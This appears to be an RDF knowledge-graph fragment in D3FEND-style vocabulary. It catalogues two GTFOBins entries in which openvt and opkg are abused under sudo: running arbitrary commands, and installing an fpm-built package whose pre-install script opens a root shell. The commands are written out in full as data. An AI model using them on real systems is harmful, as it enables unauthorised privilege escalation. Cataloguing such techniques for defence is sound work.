mknd:command_openvt-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "openvt-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file." ;
    d3f:uses mknd:executable_openvt ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_openvt ;
    mknd:provides mknd:function_sudo ;
    mknd:value """COMMAND=id
TF=$(mktemp -u)
sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
cat $TF
""" .

mknd:command_opkg-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "opkg-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
""" ;
    d3f:uses mknd:executable_opkg ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_opkg ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo opkg install x_1.0_all.deb
""" .

